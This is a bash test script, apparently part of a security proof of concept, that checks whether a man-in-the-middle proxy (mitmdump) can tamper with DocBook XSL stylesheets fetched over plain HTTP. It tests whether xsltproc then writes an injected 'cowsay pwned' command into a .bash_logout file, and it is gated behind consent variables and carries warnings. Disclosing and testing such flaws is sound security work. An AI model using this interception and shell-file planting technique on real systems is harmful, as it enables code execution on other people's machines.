#!/usr/bin/env bash

# Copyright © 2022 Jakub Wilk <jwilk@jwilk.net>
# SPDX-License-Identifier: MIT

set -e -u
set -m

echo 1..2

if [ -z "${DOCBOOK_XSL_MITM_NETWORK_TESTING-}" ]
then
    echo 'Bail out! Network testing requires user consent. Set DOCBOOK_XSL_MITM_NETWORK_TESTING=1 to go for it.'
    exit 1
fi

for cmd in mitmdump ss curl ${DOCBOOK_XSL_MITM_DANGEROUS_TESTING:+xsltproc}
do
    if ! command -v "$cmd" > /dev/null
    then
        echo "Bail out! $cmd is not installed"
        exit 1
    fi
done

basedir="${0%/*}/.."
pymod="$basedir/docbook_xsl_mitm.py"
port=$((1024 + RANDOM % 31744))
mitmdump -q -p $port -s "$pymod" &
trap 'kill %1; wait' EXIT
for i in $(seq 1 10)
do
    if ss -tln "sport = $port" | grep -w $port > /dev/null
    then
        break
    fi
    echo "# waiting for port $port..."
    sleep 1
done

export http_proxy="http://localhost:$port/"

xsl_url='http://docbook.sourceforge.net/release/xsl/current/manpages/docbook.xsl'
out=$(curl --silent --fail --show-error "$xsl_url")
case $out in
    *$'>cowsay pwned\n<'*)
        echo ok 1;;
    *)
        echo not ok 1;
        echo not ok 2;
        exit;;
esac

if [ -z "${DOCBOOK_XSL_MITM_DANGEROUS_TESTING-}" ]
then
    echo ok 2 '# skip: This test makes you vulnerable to local and remote attacks. Set DOCBOOK_XSL_MITM_DANGEROUS_TESTING=1 to go for it.'
    exit
fi

tmpdir=$(mktemp -d /tmp/docbook-xsl-mitm.XXXXXX)
cd "$tmpdir"
echo '<foo/>' > 'foo.xml'
XML_CATALOG_FILES=/nonexistent xsltproc "$xsl_url" foo.xml || true
if grep -x 'cowsay pwned' .bash_logout > /dev/null
then
    echo ok 2
else
    echo not ok 2
fi
cd /
rm -rf "$tmpdir"

# vim:ts=4 sts=4 sw=4 et ft=sh
